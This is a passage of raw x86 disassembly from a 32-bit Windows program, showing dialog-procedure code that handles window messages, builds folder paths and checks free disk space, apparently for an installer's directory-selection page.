  403ba9:	8b 09                	mov    (%ecx),%ecx
  403bab:	a1 38 40 42 00       	mov    0x424038,%eax
  403bb0:	33 ed                	xor    %ebp,%ebp
  403bb2:	8b 7a 14             	mov    0x14(%edx),%edi
  403bb5:	03 c1                	add    %ecx,%eax
  403bb7:	ff 72 34             	push   0x34(%edx)
  403bba:	8b 74 24 60          	mov    0x60(%esp),%esi
  403bbe:	33 db                	xor    %ebx,%ebx
  403bc0:	c1 ef 05             	shr    $0x5,%edi
  403bc3:	45                   	inc    %ebp
  403bc4:	0f be 08             	movsbl (%eax),%ecx
  403bc7:	f7 d7                	not    %edi
  403bc9:	0b 7a 14             	or     0x14(%edx),%edi
  403bcc:	40                   	inc    %eax
  403bcd:	6a 22                	push   $0x22
  403bcf:	56                   	push   %esi
  403bd0:	89 4c 24 70          	mov    %ecx,0x70(%esp)
  403bd4:	23 fd                	and    %ebp,%edi
  403bd6:	89 44 24 6c          	mov    %eax,0x6c(%esp)
  403bda:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  403bde:	89 5c 24 20          	mov    %ebx,0x20(%esp)
  403be2:	c7 44 24 24 eb 53 40 	movl   $0x4053eb,0x24(%esp)
  403be9:	00 
  403bea:	e8 d8 16 00 00       	call   0x4052c7
  403bef:	8b 44 24 68          	mov    0x68(%esp),%eax
  403bf3:	ff 70 38             	push   0x38(%eax)
  403bf6:	6a 23                	push   $0x23
  403bf8:	56                   	push   %esi
  403bf9:	e8 c9 16 00 00       	call   0x4052c7
  403bfe:	8b c7                	mov    %edi,%eax
  403c00:	33 c5                	xor    %ebp,%eax
  403c02:	55                   	push   %ebp
  403c03:	05 0a 04 00 00       	add    $0x40a,%eax
  403c08:	50                   	push   %eax
  403c09:	56                   	push   %esi
  403c0a:	ff 15 cc 81 40 00    	call   *0x4081cc
  403c10:	57                   	push   %edi
  403c11:	ff 35 dc 05 42 00    	push   0x4205dc
  403c17:	ff 15 28 82 40 00    	call   *0x408228
  403c1d:	68 e8 03 00 00       	push   $0x3e8
  403c22:	56                   	push   %esi
  403c23:	ff 15 2c 82 40 00    	call   *0x40822c
  403c29:	8b f0                	mov    %eax,%esi
  403c2b:	56                   	push   %esi
  403c2c:	e8 7f 16 00 00       	call   0x4052b0
  403c31:	8b 3d 40 82 40 00    	mov    0x408240,%edi
  403c37:	53                   	push   %ebx
  403c38:	55                   	push   %ebp
  403c39:	68 5b 04 00 00       	push   $0x45b
  403c3e:	56                   	push   %esi
  403c3f:	ff d7                	call   *%edi
  403c41:	a1 10 40 42 00       	mov    0x424010,%eax
  403c46:	8b 40 68             	mov    0x68(%eax),%eax
  403c49:	85 c0                	test   %eax,%eax
  403c4b:	79 09                	jns    0x403c56
  403c4d:	f7 d8                	neg    %eax
  403c4f:	50                   	push   %eax
  403c50:	ff 15 90 81 40 00    	call   *0x408190
  403c56:	50                   	push   %eax
  403c57:	53                   	push   %ebx
  403c58:	68 43 04 00 00       	push   $0x443
  403c5d:	56                   	push   %esi
  403c5e:	ff d7                	call   *%edi
  403c60:	68 00 00 01 04       	push   $0x4010000
  403c65:	53                   	push   %ebx
  403c66:	68 45 04 00 00       	push   $0x445
  403c6b:	56                   	push   %esi
  403c6c:	ff d7                	call   *%edi
  403c6e:	ff 74 24 60          	push   0x60(%esp)
  403c72:	e8 67 2b 00 00       	call   0x4067de
  403c77:	50                   	push   %eax
  403c78:	53                   	push   %ebx
  403c79:	68 35 04 00 00       	push   $0x435
  403c7e:	56                   	push   %esi
  403c7f:	ff d7                	call   *%edi
  403c81:	8d 44 24 10          	lea    0x10(%esp),%eax
  403c85:	89 1d e4 05 42 00    	mov    %ebx,0x4205e4
  403c8b:	50                   	push   %eax
  403c8c:	ff 74 24 68          	push   0x68(%esp)
  403c90:	68 49 04 00 00       	push   $0x449
  403c95:	56                   	push   %esi
  403c96:	ff d7                	call   *%edi
  403c98:	89 1d e4 05 42 00    	mov    %ebx,0x4205e4
  403c9e:	33 c0                	xor    %eax,%eax
  403ca0:	e9 b7 01 00 00       	jmp    0x403e5c
  403ca5:	81 7c 24 60 11 01 00 	cmpl   $0x111,0x60(%esp)
  403cac:	00 
  403cad:	8b 6c 24 68          	mov    0x68(%esp),%ebp
  403cb1:	75 73                	jne    0x403d26
  403cb3:	8b 44 24 64          	mov    0x64(%esp),%eax
  403cb7:	c1 e8 10             	shr    $0x10,%eax
  403cba:	66 85 c0             	test   %ax,%ax
  403cbd:	0f 85 8b 01 00 00    	jne    0x403e4e
  403cc3:	83 3d e4 05 42 00 00 	cmpl   $0x0,0x4205e4
  403cca:	0f 85 7e 01 00 00    	jne    0x403e4e
  403cd0:	8b 35 d4 05 42 00    	mov    0x4205d4,%esi
  403cd6:	f6 46 14 20          	testb  $0x20,0x14(%esi)
  403cda:	0f 84 6e 01 00 00    	je     0x403e4e
  403ce0:	33 db                	xor    %ebx,%ebx
  403ce2:	53                   	push   %ebx
  403ce3:	53                   	push   %ebx
  403ce4:	68 f0 00 00 00       	push   $0xf0
  403ce9:	68 0a 04 00 00       	push   $0x40a
  403cee:	ff 74 24 6c          	push   0x6c(%esp)
  403cf2:	ff 15 2c 82 40 00    	call   *0x40822c
  403cf8:	50                   	push   %eax
  403cf9:	ff 15 40 82 40 00    	call   *0x408240
  403cff:	8b c8                	mov    %eax,%ecx
  403d01:	8b 46 14             	mov    0x14(%esi),%eax
  403d04:	83 e1 01             	and    $0x1,%ecx
  403d07:	83 e0 fe             	and    $0xfffffffe,%eax
  403d0a:	51                   	push   %ecx
  403d0b:	ff 35 dc 05 42 00    	push   0x4205dc
  403d11:	0b c1                	or     %ecx,%eax
  403d13:	89 46 14             	mov    %eax,0x14(%esi)
  403d16:	ff 15 28 82 40 00    	call   *0x408228
  403d1c:	e8 c8 15 00 00       	call   0x4052e9
  403d21:	e9 28 01 00 00       	jmp    0x403e4e
  403d26:	83 7c 24 60 4e       	cmpl   $0x4e,0x60(%esp)
  403d2b:	0f 85 0d 01 00 00    	jne    0x403e3e
  403d31:	68 e8 03 00 00       	push   $0x3e8
  403d36:	ff 74 24 60          	push   0x60(%esp)
  403d3a:	ff 15 2c 82 40 00    	call   *0x40822c
  403d40:	8b 4d 08             	mov    0x8(%ebp),%ecx
  403d43:	33 db                	xor    %ebx,%ebx
  403d45:	8b d0                	mov    %eax,%edx
  403d47:	81 f9 0b 07 00 00    	cmp    $0x70b,%ecx
  403d4d:	0f 85 a1 00 00 00    	jne    0x403df4
  403d53:	81 7d 0c 01 02 00 00 	cmpl   $0x201,0xc(%ebp)
  403d5a:	0f 85 ee 00 00 00    	jne    0x403e4e
  403d60:	8b 45 1c             	mov    0x1c(%ebp),%eax
  403d63:	8b 4d 18             	mov    0x18(%ebp),%ecx
  403d66:	89 44 24 14          	mov    %eax,0x14(%esp)
  403d6a:	2b c1                	sub    %ecx,%eax
  403d6c:	89 4c 24 10          	mov    %ecx,0x10(%esp)
  403d70:	c7 44 24 18 a0 2f 42 	movl   $0x422fa0,0x18(%esp)
  403d77:	00 
  403d78:	3d 00 08 00 00       	cmp    $0x800,%eax
  403d7d:	0f 83 cb 00 00 00    	jae    0x403e4e
  403d83:	8d 44 24 10          	lea    0x10(%esp),%eax
  403d87:	50                   	push   %eax
  403d88:	53                   	push   %ebx
  403d89:	68 4b 04 00 00       	push   $0x44b
  403d8e:	52                   	push   %edx
  403d8f:	ff 15 40 82 40 00    	call   *0x408240
  403d95:	8b 3d 88 81 40 00    	mov    0x408188,%edi
  403d9b:	68 02 7f 00 00       	push   $0x7f02
  403da0:	53                   	push   %ebx
  403da1:	ff d7                	call   *%edi
  403da3:	8b 35 98 81 40 00    	mov    0x408198,%esi
  403da9:	50                   	push   %eax
  403daa:	ff d6                	call   *%esi
  403dac:	8b 44 24 5c          	mov    0x5c(%esp),%eax
  403db0:	89 44 24 24          	mov    %eax,0x24(%esp)
  403db4:	8b 44 24 18          	mov    0x18(%esp),%eax
  403db8:	89 44 24 2c          	mov    %eax,0x2c(%esp)
  403dbc:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  403dc0:	50                   	push   %eax
  403dc1:	c7 44 24 24 00 05 00 	movl   $0x500,0x24(%esp)
  403dc8:	00 
  403dc9:	c7 44 24 3c 01 00 00 	movl   $0x1,0x3c(%esp)
  403dd0:	00 
  403dd1:	c7 44 24 2c 90 84 40 	movl   $0x408490,0x2c(%esp)
  403dd8:	00 
  403dd9:	89 5c 24 34          	mov    %ebx,0x34(%esp)
  403ddd:	89 5c 24 38          	mov    %ebx,0x38(%esp)
  403de1:	e8 c6 28 00 00       	call   0x4066ac
  403de6:	68 00 7f 00 00       	push   $0x7f00
  403deb:	53                   	push   %ebx
  403dec:	ff d7                	call   *%edi
  403dee:	50                   	push   %eax
  403def:	ff d6                	call   *%esi
  403df1:	8b 4d 08             	mov    0x8(%ebp),%ecx
  403df4:	81 f9 00 07 00 00    	cmp    $0x700,%ecx
  403dfa:	75 52                	jne    0x403e4e
  403dfc:	81 7d 0c 00 01 00 00 	cmpl   $0x100,0xc(%ebp)
  403e03:	75 49                	jne    0x403e4e
  403e05:	8b 45 10             	mov    0x10(%ebp),%eax
  403e08:	83 f8 0d             	cmp    $0xd,%eax
  403e0b:	75 17                	jne    0x403e24
  403e0d:	53                   	push   %ebx
  403e0e:	6a 01                	push   $0x1
  403e10:	68 11 01 00 00       	push   $0x111
  403e15:	ff 35 f8 37 42 00    	push   0x4237f8
  403e1b:	ff 15 40 82 40 00    	call   *0x408240
  403e21:	8b 45 10             	mov    0x10(%ebp),%eax
  403e24:	83 f8 1b             	cmp    $0x1b,%eax
  403e27:	75 10                	jne    0x403e39
  403e29:	53                   	push   %ebx
  403e2a:	53                   	push   %ebx
  403e2b:	6a 10                	push   $0x10
  403e2d:	ff 35 f8 37 42 00    	push   0x4237f8
  403e33:	ff 15 40 82 40 00    	call   *0x408240
  403e39:	33 c0                	xor    %eax,%eax
  403e3b:	40                   	inc    %eax
  403e3c:	eb 1e                	jmp    0x403e5c
  403e3e:	81 7c 24 60 0b 04 00 	cmpl   $0x40b,0x60(%esp)
  403e45:	00 
  403e46:	75 06                	jne    0x403e4e
  403e48:	ff 05 e4 05 42 00    	incl   0x4205e4
  403e4e:	55                   	push   %ebp
  403e4f:	ff 74 24 68          	push   0x68(%esp)
  403e53:	ff 74 24 68          	push   0x68(%esp)
  403e57:	e8 42 16 00 00       	call   0x40549e
  403e5c:	5f                   	pop    %edi
  403e5d:	5e                   	pop    %esi
  403e5e:	5d                   	pop    %ebp
  403e5f:	5b                   	pop    %ebx
  403e60:	83 c4 48             	add    $0x48,%esp
  403e63:	c2 10 00             	ret    $0x10
  403e66:	83 ec 48             	sub    $0x48,%esp
  403e69:	8b 0d d4 05 42 00    	mov    0x4205d4,%ecx
  403e6f:	56                   	push   %esi
  403e70:	57                   	push   %edi
  403e71:	8b 7c 24 58          	mov    0x58(%esp),%edi
  403e75:	8b 71 3c             	mov    0x3c(%ecx),%esi
  403e78:	c1 e6 0a             	shl    $0xa,%esi
  403e7b:	81 c6 00 50 42 00    	add    $0x425000,%esi
  403e81:	89 4c 24 1c          	mov    %ecx,0x1c(%esp)
  403e85:	81 ff 0b 04 00 00    	cmp    $0x40b,%edi
  403e8b:	75 16                	jne    0x403ea3
  403e8d:	56                   	push   %esi
  403e8e:	68 fb 03 00 00       	push   $0x3fb
  403e93:	e8 5b 28 00 00       	call   0x4066f3
  403e98:	56                   	push   %esi
  403e99:	e8 0d 2b 00 00       	call   0x4069ab
  403e9e:	e9 34 03 00 00       	jmp    0x4041d7
  403ea3:	53                   	push   %ebx
  403ea4:	55                   	push   %ebp
  403ea5:	81 ff 10 01 00 00    	cmp    $0x110,%edi
  403eab:	75 73                	jne    0x403f20
  403ead:	8b 5c 24 5c          	mov    0x5c(%esp),%ebx
  403eb1:	68 fb 03 00 00       	push   $0x3fb
  403eb6:	53                   	push   %ebx
  403eb7:	ff 15 2c 82 40 00    	call   *0x40822c
  403ebd:	56                   	push   %esi
  403ebe:	8b e8                	mov    %eax,%ebp
  403ec0:	e8 97 2b 00 00       	call   0x406a5c
  403ec5:	85 c0                	test   %eax,%eax
  403ec7:	74 10                	je     0x403ed9
  403ec9:	56                   	push   %esi
  403eca:	e8 a4 29 00 00       	call   0x406873
  403ecf:	85 c0                	test   %eax,%eax
  403ed1:	75 06                	jne    0x403ed9
  403ed3:	56                   	push   %esi
  403ed4:	e8 2b 23 00 00       	call   0x406204
  403ed9:	56                   	push   %esi
  403eda:	55                   	push   %ebp
  403edb:	89 1d dc 37 42 00    	mov    %ebx,0x4237dc
  403ee1:	ff 15 fc 81 40 00    	call   *0x4081fc
  403ee7:	8b 74 24 68          	mov    0x68(%esp),%esi
  403eeb:	ff 76 34             	push   0x34(%esi)
  403eee:	6a 01                	push   $0x1
  403ef0:	53                   	push   %ebx
  403ef1:	e8 d1 13 00 00       	call   0x4052c7
  403ef6:	ff 76 30             	push   0x30(%esi)
  403ef9:	6a 14                	push   $0x14
  403efb:	53                   	push   %ebx
  403efc:	e8 c6 13 00 00       	call   0x4052c7
  403f01:	55                   	push   %ebp
  403f02:	e8 a9 13 00 00       	call   0x4052b0
  403f07:	6a 09                	push   $0x9
  403f09:	e8 95 26 00 00       	call   0x4065a3
  403f0e:	85 c0                	test   %eax,%eax
  403f10:	0f 84 bf 02 00 00    	je     0x4041d5
  403f16:	6a 01                	push   $0x1
  403f18:	55                   	push   %ebp
  403f19:	ff d0                	call   *%eax
  403f1b:	e9 b5 02 00 00       	jmp    0x4041d5
  403f20:	bb fb 03 00 00       	mov    $0x3fb,%ebx
  403f25:	81 ff 11 01 00 00    	cmp    $0x111,%edi
  403f2b:	0f 85 dc 00 00 00    	jne    0x40400d
  403f31:	8b 54 24 64          	mov    0x64(%esp),%edx
  403f35:	0f b7 c2             	movzwl %dx,%eax
  403f38:	66 3b c3             	cmp    %bx,%ax
  403f3b:	75 1d                	jne    0x403f5a
  403f3d:	8b c2                	mov    %edx,%eax
  403f3f:	b9 00 03 00 00       	mov    $0x300,%ecx
  403f44:	c1 e8 10             	shr    $0x10,%eax
  403f47:	66 3b c1             	cmp    %cx,%ax
  403f4a:	0f 85 bd 00 00 00    	jne    0x40400d
  403f50:	bf 0f 04 00 00       	mov    $0x40f,%edi
  403f55:	e9 c8 00 00 00       	jmp    0x404022
  403f5a:	ba e9 03 00 00       	mov    $0x3e9,%edx
  403f5f:	66 3b c2             	cmp    %dx,%ax
  403f62:	0f 85 a5 00 00 00    	jne    0x40400d
  403f68:	ff 71 38             	push   0x38(%ecx)
  403f6b:	8b 5c 24 60          	mov    0x60(%esp),%ebx
  403f6f:	bd d0 f5 41 00       	mov    $0x41f5d0,%ebp
  403f74:	83 64 24 40 00       	andl   $0x0,0x40(%esp)
  403f79:	83 64 24 58 00       	andl   $0x0,0x58(%esp)
  403f7e:	68 f0 05 42 00       	push   $0x4205f0
  403f83:	89 5c 24 40          	mov    %ebx,0x40(%esp)
  403f87:	89 6c 24 48          	mov    %ebp,0x48(%esp)
  403f8b:	c7 44 24 54 e2 4c 40 	movl   $0x404ce2,0x54(%esp)
  403f92:	00 
  403f93:	89 74 24 58          	mov    %esi,0x58(%esp)
  403f97:	e8 69 1c 00 00       	call   0x405c05
  403f9c:	89 44 24 44          	mov    %eax,0x44(%esp)
  403fa0:	8d 44 24 38          	lea    0x38(%esp),%eax
  403fa4:	50                   	push   %eax
  403fa5:	c7 44 24 4c 41 00 00 	movl   $0x41,0x4c(%esp)
  403fac:	00 
  403fad:	ff 15 68 81 40 00    	call   *0x408168
  403fb3:	85 c0                	test   %eax,%eax
  403fb5:	74 99                	je     0x403f50
  403fb7:	50                   	push   %eax
  403fb8:	ff 15 88 82 40 00    	call   *0x408288
  403fbe:	56                   	push   %esi
  403fbf:	e8 40 22 00 00       	call   0x406204
  403fc4:	a1 10 40 42 00       	mov    0x424010,%eax
  403fc9:	8b 80 1c 01 00 00    	mov    0x11c(%eax),%eax
  403fcf:	85 c0                	test   %eax,%eax
  403fd1:	74 28                	je     0x403ffb
  403fd3:	81 fe 00 a4 42 00    	cmp    $0x42a400,%esi
  403fd9:	75 20                	jne    0x403ffb
  403fdb:	50                   	push   %eax
  403fdc:	6a 00                	push   $0x0
  403fde:	e8 22 1c 00 00       	call   0x405c05
  403fe3:	55                   	push   %ebp
  403fe4:	bd a0 2f 42 00       	mov    $0x422fa0,%ebp
  403fe9:	55                   	push   %ebp
  403fea:	ff 15 e0 80 40 00    	call   *0x4080e0
  403ff0:	85 c0                	test   %eax,%eax
  403ff2:	74 07                	je     0x403ffb
  403ff4:	55                   	push   %ebp
  403ff5:	56                   	push   %esi
  403ff6:	e8 c7 27 00 00       	call   0x4067c2
  403ffb:	ff 05 e8 05 42 00    	incl   0x4205e8
  404001:	56                   	push   %esi
  404002:	68 fb 03 00 00       	push   $0x3fb
  404007:	53                   	push   %ebx
  404008:	e8 af 27 00 00       	call   0x4067bc
  40400d:	8b c7                	mov    %edi,%eax
  40400f:	81 ff 0f 04 00 00    	cmp    $0x40f,%edi
  404015:	74 0b                	je     0x404022
  404017:	3d 05 04 00 00       	cmp    $0x405,%eax
  40401c:	0f 85 b3 01 00 00    	jne    0x4041d5
  404022:	83 64 24 20 00       	andl   $0x0,0x20(%esp)
  404027:	56                   	push   %esi
  404028:	68 fb 03 00 00       	push   $0x3fb
  40402d:	e8 c1 26 00 00       	call   0x4066f3
  404032:	56                   	push   %esi
  404033:	e8 a7 22 00 00       	call   0x4062df
  404038:	33 ed                	xor    %ebp,%ebp
  40403a:	33 c9                	xor    %ecx,%ecx
  40403c:	45                   	inc    %ebp
  40403d:	bb f0 09 42 00       	mov    $0x4209f0,%ebx
  404042:	85 c0                	test   %eax,%eax
  404044:	56                   	push   %esi
  404045:	0f 44 cd             	cmove  %ebp,%ecx
  404048:	53                   	push   %ebx
  404049:	89 4c 24 68          	mov    %ecx,0x68(%esp)
  40404d:	e8 76 27 00 00       	call   0x4067c8
  404052:	55                   	push   %ebp
  404053:	e8 4b 25 00 00       	call   0x4065a3
  404058:	89 44 24 10          	mov    %eax,0x10(%esp)
  40405c:	85 c0                	test   %eax,%eax
  40405e:	74 46                	je     0x4040a6
  404060:	33 db                	xor    %ebx,%ebx
  404062:	8d 4c 24 28          	lea    0x28(%esp),%ecx
  404066:	51                   	push   %ecx
  404067:	8d 4c 24 1c          	lea    0x1c(%esp),%ecx
  40406b:	51                   	push   %ecx
  40406c:	8d 4c 24 38          	lea    0x38(%esp),%ecx
  404070:	51                   	push   %ecx
  404071:	68 f0 09 42 00       	push   $0x4209f0
  404076:	ff d0                	call   *%eax
  404078:	85 c0                	test   %eax,%eax
  40407a:	75 7d                	jne    0x4040f9
  40407c:	85 db                	test   %ebx,%ebx
  40407e:	74 02                	je     0x404082
  404080:	88 03                	mov    %al,(%ebx)
  404082:	68 f0 09 42 00       	push   $0x4209f0
  404087:	e8 f4 28 00 00       	call   0x406980
  40408c:	8b d8                	mov    %eax,%ebx
  40408e:	8b 44 24 10          	mov    0x10(%esp),%eax
  404092:	c6 03 00             	movb   $0x0,(%ebx)
  404095:	4b                   	dec    %ebx
  404096:	c6 03 5c             	movb   $0x5c,(%ebx)
  404099:	81 fb f0 09 42 00    	cmp    $0x4209f0,%ebx
  40409f:	75 c1                	jne    0x404062
  4040a1:	bb f0 09 42 00       	mov    $0x4209f0,%ebx
  4040a6:	56                   	push   %esi
  4040a7:	53                   	push   %ebx
  4040a8:	e8 1b 27 00 00       	call   0x4067c8
  4040ad:	53                   	push   %ebx
  4040ae:	e8 c0 27 00 00       	call   0x406873
  4040b3:	85 c0                	test   %eax,%eax
  4040b5:	74 03                	je     0x4040ba
  4040b7:	c6 00 00             	movb   $0x0,(%eax)
  4040ba:	8d 44 24 28          	lea    0x28(%esp),%eax
  4040be:	50                   	push   %eax
  4040bf:	8d 44 24 14          	lea    0x14(%esp),%eax
  4040c3:	50                   	push   %eax
  4040c4:	8d 44 24 20          	lea    0x20(%esp),%eax
  4040c8:	50                   	push   %eax
  4040c9:	8d 44 24 20          	lea    0x20(%esp),%eax
  4040cd:	50                   	push   %eax
  4040ce:	53                   	push   %ebx
  4040cf:	ff 15 98 80 40 00    	call   *0x408098
  4040d5:	85 c0                	test   %eax,%eax
  4040d7:	74 39                	je     0x404112
  4040d9:	8b 44 24 14          	mov    0x14(%esp),%eax
  4040dd:	0f af 44 24 18       	imul   0x18(%esp),%eax
  4040e2:	68 00 04 00 00       	push   $0x400
  4040e7:	ff 74 24 14          	push   0x14(%esp)
  4040eb:	50                   	push   %eax
  4040ec:	ff 15 e8 80 40 00    	call   *0x4080e8
  4040f2:	99                   	cltd
  4040f3:	8b d8                	mov    %eax,%ebx
  4040f5:	8b f2                	mov    %edx,%esi
  4040f7:	eb 0f                	jmp    0x404108
  4040f9:	8b 5c 24 30          	mov    0x30(%esp),%ebx
  4040fd:	8b 74 24 34          	mov    0x34(%esp),%esi
  404101:	0f ac f3 0a          	shrd   $0xa,%esi,%ebx
  404105:	c1 ee 0a             	shr    $0xa,%esi
  404108:	89 5c 24 30          	mov    %ebx,0x30(%esp)
  40410c:	89 74 24 34          	mov    %esi,0x34(%esp)
  404110:	eb 0c                	jmp    0x40411e
  404112:	8b 74 24 34          	mov    0x34(%esp),%esi
  404116:	8b 5c 24 30          	mov    0x30(%esp),%ebx
  40411a:	8b 6c 24 20          	mov    0x20(%esp),%ebp
  40411e:	6a 05                	push   $0x5
  404120:	e8 53 14 00 00       	call   0x405578
  404125:	8b c8                	mov    %eax,%ecx
  404127:	85 ed                	test   %ebp,%ebp
  404129:	74 0f                	je     0x40413a
  40412b:	85 f6                	test   %esi,%esi
  40412d:	77 0b                	ja     0x40413a
  40412f:	72 04                	jb     0x404135
  404131:	3b d9                	cmp    %ecx,%ebx
  404133:	73 05                	jae    0x40413a
  404135:	6a 02                	push   $0x2
  404137:	5b                   	pop    %ebx
  404138:	eb 04                	jmp    0x40413e
  40413a:	8b 5c 24 60          	mov    0x60(%esp),%ebx
  40413e:	a1 e0 37 42 00       	mov    0x4237e0,%eax
  404143:	83 78 10 00          	cmpl   $0x0,0x10(%eax)
  404147:	74 3c                	je     0x404185
  404149:	6a 00                	push   $0x0
  40414b:	51                   	push   %ecx
  40414c:	6a fb                	push   $0xfffffffb
  40414e:	68 ff 03 00 00       	push   $0x3ff
  404153:	e8 b5 11 00 00       	call   0x40530d
  404158:	85 ed                	test   %ebp,%ebp
  40415a:	74 16                	je     0x404172
  40415c:	ff 74 24 34          	push   0x34(%esp)
  404160:	ff 74 24 34          	push   0x34(%esp)
  404164:	6a fc                	push   $0xfffffffc
  404166:	68 00 04 00 00       	push   $0x400
  40416b:	e8 9d 11 00 00       	call   0x40530d
  404170:	eb 13                	jmp    0x404185
  404172:	68 4b 84 40 00       	push   $0x40844b
  404177:	68 00 04 00 00       	push   $0x400
  40417c:	ff 74 24 64          	push   0x64(%esp)
  404180:	e8 37 26 00 00       	call   0x4067bc
  404185:	89 1d e4 40 42 00    	mov    %ebx,0x4240e4
  40418b:	85 db                	test   %ebx,%ebx
  40418d:	75 09                	jne    0x404198
  40418f:	6a 07                	push   $0x7
  404191:	e8 9d d3 ff ff       	call   0x401533
  404196:	8b d8                	mov    %eax,%ebx
  404198:	8b 44 24 24          	mov    0x24(%esp),%eax
  40419c:	6a 00                	push   $0x0
  40419e:	5e                   	pop    %esi
  40419f:	f7 40 14 00 04 00 00 	testl  $0x400,0x14(%eax)
  4041a6:	0f 44 f3             	cmove  %ebx,%esi
  4041a9:	33 c0                	xor    %eax,%eax
  4041ab:	85 f6                	test   %esi,%esi
  4041ad:	0f 94 c0             	sete   %al
  4041b0:	50                   	push   %eax
  4041b1:	ff 35 dc 05 42 00    	push   0x4205dc
  4041b7:	ff 15 28 82 40 00    	call   *0x408228
  4041bd:	85 f6                	test   %esi,%esi
  4041bf:	75 0d                	jne    0x4041ce
  4041c1:	39 35 e8 05 42 00    	cmp    %esi,0x4205e8
  4041c7:	75 05                	jne    0x4041ce
  4041c9:	e8 1b 11 00 00       	call   0x4052e9
  4041ce:	83 25 e8 05 42 00 00 	andl   $0x0,0x4205e8
  4041d5:	5d                   	pop    %ebp
  4041d6:	5b                   	pop    %ebx
  4041d7:	ff 74 24 60          	push   0x60(%esp)
  4041db:	ff 74 24 60          	push   0x60(%esp)
  4041df:	57                   	push   %edi
  4041e0:	e8 b9 12 00 00       	call   0x40549e
  4041e5:	5f                   	pop    %edi
  4041e6:	5e                   	pop    %esi
  4041e7:	83 c4 48             	add    $0x48,%esp
  4041ea:	c2 10 00             	ret    $0x10
  4041ed:	83 ec 50             	sub    $0x50,%esp
  4041f0:	53                   	push   %ebx
  4041f1:	8b 1d 2c 82 40 00    	mov    0x40822c,%ebx
  4041f7:	b8 f9 03 00 00       	mov    $0x3f9,%eax
  4041fc:	55                   	push   %ebp
  4041fd:	56                   	push   %esi
  4041fe:	8b 74 24 60          	mov    0x60(%esp),%esi
  404202:	57                   	push   %edi
  404203:	50                   	push   %eax
  404204:	56                   	push   %esi
  404205:	ff d3                	call   *%ebx
  404207:	68 08 04 00 00       	push   $0x408
  40420c:	56                   	push   %esi
  40420d:	89 44 24 24          	mov    %eax,0x24(%esp)
  404211:	ff d3                	call   *%ebx
  404213:	81 7c 24 68 10 01 00 	cmpl   $0x110,0x68(%esp)
  40421a:	00 
  40421b:	8b e8                	mov    %eax,%ebp
  40421d:	a1 28 40 42 00       	mov    0x424028,%eax
  404222:	8b 1d 40 82 40 00    	mov    0x408240,%ebx
  404228:	89 44 24 18          	mov    %eax,0x18(%esp)
  40422c:	a1 10 40 42 00       	mov    0x424010,%eax
  404231:	89 6c 24 10          	mov    %ebp,0x10(%esp)
  404235:	89 44 24 20          	mov    %eax,0x20(%esp)
  404239:	0f 85 1d 02 00 00    	jne    0x40445c
  40423f:	a1 2c 40 42 00       	mov    0x42402c,%eax
  404244:	83 64 24 14 00       	andl   $0x0,0x14(%esp)
  404249:	6a 02                	push   $0x2
  40424b:	5f                   	pop    %edi
  40424c:	c1 e0 02             	shl    $0x2,%eax
  40424f:	50                   	push   %eax
  404250:	6a 40                	push   $0x40
  404252:	89 35 b8 40 42 00    	mov    %esi,0x4240b8
  404258:	ff 15 f4 80 40 00    	call   *0x4080f4
  40425e:	a3 f4 0d 42 00       	mov    %eax,0x420df4
  404263:	33 c0                	xor    %eax,%eax
  404265:	50                   	push   %eax
  404266:	50                   	push   %eax
  404267:	50                   	push   %eax
  404268:	50                   	push   %eax
  404269:	6a 6e                	push   $0x6e
  40426b:	ff 35 f4 37 42 00    	push   0x4237f4
  404271:	ff 15 0c 82 40 00    	call   *0x40820c
  404277:	83 0d f0 0d 42 00 ff 	orl    $0xffffffff,0x420df0
  40427e:	8b f0                	mov    %eax,%esi
  404280:	68 13 56 40 00       	push   $0x405613
  404285:	6a fc                	push   $0xfffffffc
  404287:	55                   	push   %ebp
  404288:	ff 15 14 82 40 00    	call   *0x408214
  40428e:	6a 00                	push   $0x0
  404290:	6a 06                	push   $0x6
  404292:	6a 21                	push   $0x21
  404294:	6a 10                	push   $0x10
  404296:	6a 10                	push   $0x10
  404298:	a3 ec 05 42 00       	mov    %eax,0x4205ec
  40429d:	ff 15 38 80 40 00    	call   *0x408038
  4042a3:	68 ff 00 ff 00       	push   $0xff00ff
  4042a8:	56                   	push   %esi
  4042a9:	50                   	push   %eax
  4042aa:	a3 f8 0d 42 00       	mov    %eax,0x420df8
  4042af:	ff 15 40 80 40 00    	call   *0x408040
  4042b5:	ff 35 f8 0d 42 00    	push   0x420df8
  4042bb:	57                   	push   %edi
  4042bc:	68 09 11 00 00       	push   $0x1109
  4042c1:	55                   	push   %ebp
  4042c2:	ff d3                	call   *%ebx
  4042c4:	6a 00                	push   $0x0
  4042c6:	6a 00                	push   $0x0
  4042c8:	68 1c 11 00 00       	push   $0x111c
  4042cd:	55                   	push   %ebp
  4042ce:	ff d3                	call   *%ebx
  4042d0:	83 f8 10             	cmp    $0x10,%eax
  4042d3:	7d 0c                	jge    0x4042e1
  4042d5:	6a 00                	push   $0x0
  4042d7:	6a 10                	push   $0x10
  4042d9:	68 1b 11 00 00       	push   $0x111b
  4042de:	55                   	push   %ebp
  4042df:	ff d3                	call   *%ebx
  4042e1:	56                   	push   %esi
  4042e2:	ff 15 60 80 40 00    	call   *0x408060
  4042e8:	8b 6c 24 1c          	mov    0x1c(%esp),%ebp
  4042ec:	33 f6                	xor    %esi,%esi
  4042ee:	8b 44 24 20          	mov    0x20(%esp),%eax
  4042f2:	8b 84 b0 94 00 00 00 	mov    0x94(%eax,%esi,4),%eax
  4042f9:	85 c0                	test   %eax,%eax
  4042fb:	74 27                	je     0x404324
  4042fd:	50                   	push   %eax
  4042fe:	6a 00                	push   $0x0
  404300:	e8 00 19 00 00       	call   0x405c05
  404305:	50                   	push   %eax
  404306:	6a 00                	push   $0x0
  404308:	68 43 01 00 00       	push   $0x143
  40430d:	55                   	push   %ebp
  40430e:	ff d3                	call   *%ebx
  404310:	56                   	push   %esi
  404311:	50                   	push   %eax
  404312:	68 51 01 00 00       	push   $0x151
  404317:	55                   	push   %ebp
  404318:	ff d3                	call   *%ebx
  40431a:	33 c0                	xor    %eax,%eax
  40431c:	83 fe 20             	cmp    $0x20,%esi
  40431f:	0f 44 c7             	cmove  %edi,%eax
  404322:	8b f8                	mov    %eax,%edi
  404324:	46                   	inc    %esi
  404325:	83 fe 21             	cmp    $0x21,%esi
  404328:	7c c4                	jl     0x4042ee
  40432a:	8b 5c 24 70          	mov    0x70(%esp),%ebx
  40432e:	8b 6c 24 64          	mov    0x64(%esp),%ebp
  404332:	89 7c 24 24          	mov    %edi,0x24(%esp)
